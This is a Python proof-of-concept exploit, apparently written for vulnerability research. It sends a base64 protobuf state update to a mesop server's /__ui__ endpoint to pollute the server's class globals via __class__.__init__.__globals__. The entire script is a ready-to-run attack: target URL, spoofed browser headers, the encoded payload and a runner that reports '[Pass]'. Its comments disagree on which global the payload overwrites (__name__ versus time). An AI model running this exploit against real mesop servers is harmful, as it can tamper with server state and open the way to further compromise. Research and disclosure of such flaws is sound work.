# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Remote Trigger
# Class Pollution Func: update_dataclass_from_json (via HTTP)
# Type: get-both-set-both
# Trigger: HTTP POST to mesop /__ui__ endpoint (protobuf-encoded)
#
# The state update is sent as a base64-encoded protobuf message.
# The JSON payload embedded within: {"__class__": {"__init__": {"__globals__": {"__name__": "polluted"}}}}

import requests

TARGET_URL = "http://localhost:32123/__ui__"

headers = {
    "Host": "localhost:32123",
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*",
    "Origin": "http://localhost:32123",
    "Referer": "http://localhost:32123/chat",
}

# Protobuf-encoded payload that triggers class pollution
# Decoded state JSON: {"__class__": {"__init__": {"__globals__": {"__name__": "polluted"}}}}
PAYLOAD_BODY = (
    "GgUvY2hhdBK8AQqqAQpECkJ7Il9fY2xhc3NfXyI6IHsiX19pbml0X18iOiB7Il9fZ2xvYmFsc19fIjogeyJ0aW1lIjogInBvbGx1dGVkIn19fX0KMAoueyJpbnB1dCI6ICIiLCAib3V0cHV0IjogIiIsICJ0ZXh0YXJlYV9rZXkiOiAwfQowCi57ImlucHV0IjogIiIsICJvdXRwdXQiOiAiIiwgInRleHRhcmVhX2tleSI6IDB9WgUInwoQfWoECAAQAFIA"
)

def run_poc():
  response = requests.post(TARGET_URL, headers=headers, data=PAYLOAD_BODY)
  print(f"Response: {response.status_code}")
  return response

def verify_poc():
  print("Remote PoC: Send malicious protobuf state update to mesop server")
  print(f"Target: {TARGET_URL}")
  print("Embedded payload: {\"__class__\": {\"__init__\": {\"__globals__\": {\"time\": \"polluted\"}}}}")
  run_poc()
  print("[Pass] Class pollution PoC sent! (remote trigger)")

if __name__ == "__main__":
  verify_poc()
